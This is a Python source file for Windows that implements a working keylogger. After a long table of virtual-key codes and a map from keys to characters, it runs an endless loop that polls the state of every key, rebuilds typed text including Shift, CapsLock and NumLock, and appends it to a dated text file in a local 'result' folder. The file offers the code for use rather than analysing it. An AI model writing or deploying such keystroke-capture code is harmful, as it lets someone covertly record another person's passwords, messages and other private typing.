import win32api  
import time
import os




VK_LBUTTON             = 0x01
VK_RBUTTON             = 0x02
VK_CANCEL              = 0x03   # Cancel
VK_MBUTTON             = 0x04
VK_XBUTTON1            = 0x05
VK_XBUTTON2            = 0x06
VK_BACK                = 0x08   # Backspace
VK_TAB                 = 0x09   # Tab
VK_CLEAR               = 0x0C   # Clear
VK_RETURN              = 0x0D   # Enter
VK_SHIFT               = 0x10   # Shift
VK_CONTROL             = 0x11   # Ctrl
VK_MENU                = 0x12   # Alt
VK_PAUSE               = 0x13   # Pause
VK_CAPITAL             = 0x14   # CapsLock
VK_KANA                = 0x15
VK_HANGUEL             = 0x15
VK_HANGUL              = 0x15
VK_JUNJA               = 0x17
VK_FINAL               = 0x18
VK_HANJA               = 0x19
VK_KANJI               = 0x19
VK_ESCAPE              = 0x1B   # Esc
VK_CONVERT             = 0x1C
VK_NONCONVERT          = 0x1D
VK_ACCEPT              = 0x1E
VK_MODECHANGE          = 0x1F
VK_SPACE               = 0x20   # SPACE
VK_PRIOR               = 0x21   # PageUp
VK_NEXT                = 0x22   # PageDown
VK_END                 = 0x23   # End
VK_HOME                = 0x24   # Home
VK_LEFT                = 0x25   # Left
VK_UP                  = 0x26   # Up
VK_RIGHT               = 0x27   # Right
VK_DOWN                = 0x28   # Down
VK_SELECT              = 0x29   # Select
VK_PRINT               = 0x2A   # Print
VK_EXECUTE             = 0x2B   # Execute
VK_SNAPSHOT            = 0x2C   # PrintScreen
VK_INSERT              = 0x2D
VK_DELETE              = 0x2E
VK_HELP                = 0x2F
VK_0                   = 0x30   # 0 [SHIFT] )
VK_1                   = 0x31   # 1 [SHIFT] !
VK_2                   = 0x32   # 2 [SHIFT] @
VK_3                   = 0x33   # 3 [SHIFT] #
VK_4                   = 0x34   # 4 [SHIFT] $
VK_5                   = 0x35   # 5 [SHIFT] %
VK_6                   = 0x36   # 6 [SHIFT] ^
VK_7                   = 0x37   # 7 [SHIFT] &
VK_8                   = 0x38   # 8 [SHIFT] *
VK_9                   = 0x39   # 9 [SHIFT] (
VK_A                   = 0x41   # a [UPPER] A
VK_B                   = 0x42   # b [UPPER] B
VK_C                   = 0x43   # c [UPPER] C
VK_D                   = 0x44   # d [UPPER] D
VK_E                   = 0x45   # e [UPPER] E
VK_F                   = 0x46   # f [UPPER] F
VK_G                   = 0x47   # g [UPPER] G
VK_H                   = 0x48   # h [UPPER] H
VK_I                   = 0x49   # i [UPPER] I
VK_J                   = 0x4A   # j [UPPER] J
VK_K                   = 0x4B   # k [UPPER] K
VK_L                   = 0x4C   # l [UPPER] L
VK_M                   = 0x4D   # m [UPPER] M
VK_N                   = 0x4E   # n [UPPER] N
VK_O                   = 0x4F   # o [UPPER] O
VK_P                   = 0x50   # p [UPPER] P
VK_Q                   = 0x51   # q [UPPER] Q
VK_R                   = 0x52   # r [UPPER] R
VK_S                   = 0x53   # s [UPPER] S
VK_T                   = 0x54   # t [UPPER] T
VK_U                   = 0x55   # u [UPPER] U
VK_V                   = 0x56   # v [UPPER] V
VK_W                   = 0x57   # w [UPPER] W
VK_X                   = 0x58   # x [UPPER] X
VK_Y                   = 0x59   # y [UPPER] Y
VK_Z                   = 0x5A   # z [UPPER] Z
VK_LWIN                = 0x5B
VK_RWIN                = 0x5C
VK_APPS                = 0x5D
VK_SLEEP               = 0x5F
VK_NUMPAD0             = 0x60   # Ins [NUMLOCK] 0
VK_NUMPAD1             = 0x61   # End [NUMLOCK] 1
VK_NUMPAD2             = 0x62   # Down [NUMLOCK] 2
VK_NUMPAD3             = 0x63   # PageDown [NUMLOCK] 3
VK_NUMPAD4             = 0x64   # Left [NUMLOCK] 4
VK_NUMPAD5             = 0x65   # NumPad5 [NUMLOCK] 5
VK_NUMPAD6             = 0x66   # Right [NUMLOCK] 6
VK_NUMPAD7             = 0x67   # Home [NUMLOCK] 7
VK_NUMPAD8             = 0x68   # Up [NUMLOCK] 8
VK_NUMPAD9             = 0x69   # PageUp [NUMLOCK] 9
VK_MULTIPLY            = 0x6A   # * [NUMLOCK] *
VK_ADD                 = 0x6B   # + [NUMLOCK] +
VK_SEPARATOR           = 0x6C
VK_SUBTRACT            = 0x6D   # - [NUMLOCK] -
VK_DECIMAL             = 0x6E   # Del [NUMLOCK] .
VK_DIVIDE              = 0x6F   # / [NUMLOCK] /
VK_F1                  = 0x70   # F1
VK_F2                  = 0x71   # F2
VK_F3                  = 0x72   # F3
VK_F4                  = 0x73   # F4
VK_F5                  = 0x74   # F5
VK_F6                  = 0x75   # F6
VK_F7                  = 0x76   # F7
VK_F8                  = 0x77   # F8
VK_F9                  = 0x78   # F9
VK_F10                 = 0x79   # F10
VK_F11                 = 0x7A   # F11
VK_F12                 = 0x7B   # F12
VK_F13                 = 0x7C   # F13
VK_F14                 = 0x7D   # F14
VK_F15                 = 0x7E   # F15
VK_F16                 = 0x7F   # F16
VK_F17                 = 0x80   # F17
VK_F18                 = 0x81   # F18
VK_F19                 = 0x82   # F19
VK_F20                 = 0x83   # F20
VK_F21                 = 0x84   # F21
VK_F22                 = 0x85   # F22
VK_F23                 = 0x86   # F23
VK_F24                 = 0x87   # F24
VK_NUMLOCK             = 0x90   # NumLock
VK_SCROLL              = 0x91   # Scroll
VK_LSHIFT              = 0xA0
VK_RSHIFT              = 0xA1
VK_LCONTROL            = 0xA2
VK_RCONTROL            = 0xA3
VK_LMENU               = 0xA4
VK_RMENU               = 0xA5
VK_BROWSER_BACK        = 0xA6
VK_BROWSER_FORWARD     = 0xA7
VK_BROWSER_REFRESH     = 0xA8
VK_BROWSER_STOP        = 0xA9
VK_BROWSER_SEARCH      = 0xAA
VK_BROWSER_FAVORITES   = 0xAB
VK_BROWSER_HOME        = 0xAC
VK_VOLUME_MUTE         = 0xAD
VK_VOLUME_DOWN         = 0xAE
VK_VOLUME_UP           = 0xAF
VK_MEDIA_NEXT_TRACK    = 0xB0
VK_MEDIA_PREV_TRACK    = 0xB1
VK_MEDIA_STOP          = 0xB2
VK_MEDIA_PLAY_PAUSE    = 0xB3
VK_LAUNCH_MAIL         = 0xB4
VK_LAUNCH_MEDIA_SELECT = 0xB5
VK_LAUNCH_APP1         = 0xB6
VK_LAUNCH_APP2         = 0xB7
VK_OEM_1               = 0xBA   # ; [SHIFT] :
VK_OEM_PLUS            = 0xBB   # = [SHIFT] +
VK_OEM_COMMA           = 0xBC   # , [SHIFT] <
VK_OEM_MINUS           = 0xBD   # - [SHIFT] _
VK_OEM_PERIOD          = 0xBE   # . [SHIFT] >
VK_OEM_2               = 0xBF   # / [SHIFT] ?
VK_OEM_3               = 0xC0   # ` [SHIFT] ~
VK_OEM_4               = 0xDB   # [ [SHIFT] {
VK_OEM_5               = 0xDC   # \ [SHIFT] |
VK_OEM_6               = 0xDD   # ] [SHIFT] }
VK_OEM_7               = 0xDE   # ' [SHIFT] "
VK_OEM_8               = 0xDF
VK_OEM_102             = 0xE2
VK_PROCESSKEY          = 0xE5
VK_PACKET              = 0xE7
VK_ATTN                = 0xF6
VK_CRSEL               = 0xF7
VK_EXSEL               = 0xF8
VK_EREOF               = 0xF9
VK_PLAY                = 0xFA
VK_ZOOM                = 0xFB
VK_NONAME              = 0xFC
VK_PA1                 = 0xFD
VK_OEM_CLEAR           = 0xFE



keymap = {
    VK_CANCEL:           'Cancel',
    VK_BACK:             'Backspace',
    VK_TAB:              'Tab',
    VK_CLEAR:            'Clear',
    VK_RETURN:           'Enter',
    VK_SHIFT:            'Shift',
    VK_CONTROL:          'Ctrl',
    VK_MENU:             'Alt',
    VK_PAUSE:            'Pause',
    VK_CAPITAL:          'CapsLock',
    VK_ESCAPE:           'Esc',
    VK_SPACE:            ' ',
    VK_PRIOR:            'PageUp',
    VK_NEXT:             'PageDown',
    VK_END:              'End',
    VK_HOME:             'Home',
    VK_LEFT:             'Left',
    VK_UP:               'Up',
    VK_RIGHT:            'Right',
    VK_DOWN:             'Down',
    VK_SELECT:           'Select',
    VK_PRINT:            'Print',
    VK_EXECUTE:          'Execute',
    VK_SNAPSHOT:         'PrintScreen',
    VK_0:                '0',
    VK_1:                '1',
    VK_2:                '2',
    VK_3:                '3',
    VK_4:                '4',
    VK_5:                '5',
    VK_6:                '6',
    VK_7:                '7',
    VK_8:                '8',
    VK_9:                '9',
    VK_A:                'a',
    VK_B:                'b',
    VK_C:                'c',
    VK_D:                'd',
    VK_E:                'e',
    VK_F:                'f',
    VK_G:                'g',
    VK_H:                'h',
    VK_I:                'i',
    VK_J:                'j',
    VK_K:                'k',
    VK_L:                'l',
    VK_M:                'm',
    VK_N:                'n',
    VK_O:                'o',
    VK_P:                'p',
    VK_Q:                'q',
    VK_R:                'r',
    VK_S:                's',
    VK_T:                't',
    VK_U:                'u',
    VK_V:                'v',
    VK_W:                'w',
    VK_X:                'x',
    VK_Y:                'y',
    VK_Z:                'z',
    VK_NUMPAD0:          'Ins',
    VK_NUMPAD1:          'End',
    VK_NUMPAD2:          'Down',
    VK_NUMPAD3:          'PageDown',
    VK_NUMPAD4:          'Left',
    VK_NUMPAD5:          'NumPad5',
    VK_NUMPAD6:          'Right',
    VK_NUMPAD7:          'Home',
    VK_NUMPAD8:          'Up',
    VK_NUMPAD9:          'PageUp',
    VK_MULTIPLY:         '*',
    VK_ADD:              '+',
    VK_SUBTRACT:         '-',
    VK_DECIMAL:          'Del',
    VK_DIVIDE:           '/',
    VK_F1:               'F1',
    VK_F2:               'F2',
    VK_F3:               'F3',
    VK_F4:               'F4',
    VK_F5:               'F5',
    VK_F6:               'F6',
    VK_F7:               'F7',
    VK_F8:               'F8',
    VK_F9:               'F9',
    VK_F10:              'F10',
    VK_F11:              'F11',
    VK_F12:              'F12',
    VK_F13:              'F13',
    VK_F14:              'F14',
    VK_F15:              'F15',
    VK_F16:              'F16',
    VK_F17:              'F17',
    VK_F18:              'F18',
    VK_F19:              'F19',
    VK_F20:              'F20',
    VK_F21:              'F21',
    VK_F22:              'F22',
    VK_F23:              'F23',
    VK_F24:              'F24',
    VK_NUMLOCK:          'NumLock',
    VK_SCROLL:           'Scroll',
    VK_OEM_1:            ';',
    VK_OEM_PLUS:         '=',
    VK_OEM_COMMA:        ',',
    VK_OEM_MINUS:        '-',
    VK_OEM_PERIOD:       '.',
    VK_OEM_2:            '/',
    VK_OEM_3:            '`',
    VK_OEM_4:            '[',
    VK_OEM_5:            '\\',
    VK_OEM_6:            ']',
    VK_OEM_7:            '\'',
    'Shift-0':           ')',
    'Shift-1':           '!',
    'Shift-2':           '@',
    'Shift-3':           '#',
    'Shift-4':           '$',
    'Shift-5':           '%',
    'Shift-6':           '^',
    'Shift-7':           '&',
    'Shift-8':           '*',
    'Shift-9':           '(',
    'Shift-a':           'A',
    'Shift-b':           'B',
    'Shift-c':           'C',
    'Shift-d':           'D',
    'Shift-e':           'E',
    'Shift-f':           'F',
    'Shift-g':           'G',
    'Shift-h':           'H',
    'Shift-i':           'I',
    'Shift-j':           'J',
    'Shift-k':           'K',
    'Shift-l':           'L',
    'Shift-m':           'M',
    'Shift-n':           'N',
    'Shift-o':           'O',
    'Shift-p':           'P',
    'Shift-q':           'Q',
    'Shift-r':           'R',
    'Shift-s':           'S',
    'Shift-t':           'T',
    'Shift-u':           'U',
    'Shift-v':           'V',
    'Shift-w':           'W',
    'Shift-x':           'X',
    'Shift-y':           'Y',
    'Shift-z':           'Z',
    'Shift-A':           'a',
    'Shift-B':           'b',
    'Shift-C':           'c',
    'Shift-D':           'd',
    'Shift-E':           'e',
    'Shift-F':           'f',
    'Shift-G':           'g',
    'Shift-H':           'h',
    'Shift-I':           'i',
    'Shift-J':           'j',
    'Shift-K':           'k',
    'Shift-L':           'l',
    'Shift-M':           'm',
    'Shift-N':           'n',
    'Shift-O':           'o',
    'Shift-P':           'p',
    'Shift-Q':           'q',
    'Shift-R':           'r',
    'Shift-S':           's',
    'Shift-T':           't',
    'Shift-U':           'u',
    'Shift-V':           'v',
    'Shift-W':           'w',
    'Shift-X':           'x',
    'Shift-Y':           'y',
    'Shift-Z':           'z',
    'NumLock-Ins':       '0',
    'NumLock-End':       '1',
    'NumLock-Down':      '2',
    'NumLock-PageDown':  '3',
    'NumLock-Left':      '4',
    'NumLock-NumPad5':   '5',
    'NumLock-Right':     '6',
    'NumLock-Home':      '7',
    'NumLock-Up':        '8',
    'NumLock-PageUp':    '9',
    'NumLock-*':         '*',
    'NumLock-+':         '+',
    'NumLock--':         '-',
    'NumLock-Del':       '.',
    'NumLock-/':         '/',
    'Shift-;':           ':',
    'Shift-=':           '+',
    'Shift-,':           '<',
    'Shift--':           '_',
    'Shift-.':           '>',
    'Shift-/':           '?',
    'Shift-`':           '~',
    'Shift-[':           '{',
    'Shift-\\':          '|',
    'Shift-]':           '}',
    'Shift-\'':          '\"',
}




def SaveBackSpaceFile(FullName):
    data = ''
    with open(FullName,'r') as fp: 
        data_ = fp.readline();
        while data_:
            data += data_
            data_ = fp.readline()
            
    data = data[:-1]
    with open(FullName,'w') as fp: 
         fp.write(data) 
        
    





result = ''
MAX_KEYLOGGER_BUF = 1024
SaveDirs = [os.path.join(os.getcwd(),'result')]
while True:
    name   = ''
    for code in range(8, 256):
        if code in [VK_CONTROL, VK_MENU, VK_SHIFT, VK_CAPITAL, VK_NUMLOCK]: continue
    
        status = win32api.GetAsyncKeyState(code)
        if status & 1 != 1: continue
    
        CtrlKey  = win32api.GetKeyState(VK_CONTROL) < 0
        AltKey   = win32api.GetKeyState(VK_MENU) < 0
        ShiftKey = win32api.GetKeyState(VK_SHIFT) < 0
        CapsLock = win32api.GetKeyState(VK_CAPITAL) & 1 == 1
        NumLock  = win32api.GetKeyState(VK_NUMLOCK) & 1 == 1
        # upper    = ShiftKey != CapsLock
        Modifier = []
        if CtrlKey:   Modifier.append('Control')
        if AltKey:    Modifier.append('Alt')
        if ShiftKey:  Modifier.append('Shift')
        character = keymap.get(code)
        if character is None:
            continue
        name = '-'.join(Modifier + [character])
        
        #### English 
        if VK_A <= code <= VK_Z and 'Control' not in Modifier and 'Alt' not in Modifier  and 'Shift' not in Modifier and CapsLock :            
            name = character.upper()  
        elif VK_A <= code <= VK_Z and 'Control' not in Modifier and 'Alt' not in Modifier  and 'Shift' in Modifier and CapsLock :         
            name = character  
        elif VK_A <= code <= VK_Z and 'Control' not in Modifier and 'Alt' not in Modifier  and 'Shift' in Modifier   :          
            name = character.upper()   
            
        if VK_NUMPAD0 <= code <= VK_DIVIDE and NumLock and keymap.get('NumLock-' + name):
            name = keymap.get('NumLock-' + name)
        elif keymap.get(name):
            name = keymap.get(name)
        if len(name) > 1 or ord(name) > 255:
            name = '[' + name + ']' 
            
        result += name 
             
        if result:  
            fileName = time.strftime('%Y-%m-%d') +'.txt'
            for SaveDir in SaveDirs:
                try:
                    if not os.path.exists(SaveDir):
                        os.makedirs(SaveDir)
                    FullName = os.path.join(SaveDir,fileName) 
                    
                    if '[Enter]' in result :
                        result = '\n'
                        
                    with open(FullName,'a') as fp: 
                        fp.write(result) 
                    #SaveBackSpaceFile(FullName)
                    result = ''
                except:  
                    continue  
    if len(result) > MAX_KEYLOGGER_BUF:
        result  = result[-MAX_KEYLOGGER_BUF:]  
    result = ''
    time.sleep(0.01)
    
     